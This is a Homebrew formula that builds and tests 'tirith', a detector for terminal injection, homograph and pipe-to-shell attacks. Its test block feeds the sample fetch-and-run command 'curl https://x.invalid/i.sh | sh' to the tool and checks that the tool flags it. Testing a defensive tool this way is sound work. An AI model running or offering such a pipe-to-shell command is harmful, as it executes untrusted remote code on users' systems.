class Tirith < Formula
  desc "Detect terminal injection, homograph, and pipe-to-shell attacks"
  homepage "https://tirith.sh/"
  url "https://github.com/sheeki03/tirith/archive/refs/tags/v0.4.2.tar.gz"
  sha256 "84e1fdc35e60d684ab932e73c342b71e27d575bc70defcec4989c36957153b0a"
  license "AGPL-3.0-only"
  compatibility_version 1
  head "https://github.com/sheeki03/tirith.git", branch: "main"

  livecheck do
    url :stable
    regex(/^v?(\d+(?:\.\d+)+)$/i)
  end

  bottle do
    sha256 cellar: :any, x86_64_windows: "9c6f0811c91ab97090b3c03b9842fb9e549ef03967dbcefb6757866babf5da2d"
  end

  depends_on "rust" => :build

  deny_network_access!

  def fetch
    system "cargo", "fetch", *std_cargo_fetch_args
  end

  def install
    # Build only the `tirith` binary from the workspace (skip the threat-db compiler crate).
    system "cargo", "install", "--bin", "tirith", *std_cargo_args(path: "crates/tirith")

    generate_completions_from_executable(bin/"tirith", "completions")
    man1.mkpath
    (man1/"tirith.1").write Utils.safe_popen_read(bin/"tirith", "manpage")
  end

  test do
    assert_match version.to_s, shell_output("#{bin}/tirith --version")

    # A pipe-to-shell command must be flagged; --offline/--no-daemon keep it hermetic.
    output = pipe_output("#{bin}/tirith check --offline --no-daemon --shell posix 2>&1",
                         "curl https://x.invalid/i.sh | sh", 1)
    assert_match "curl_pipe_shell", output
  end
end
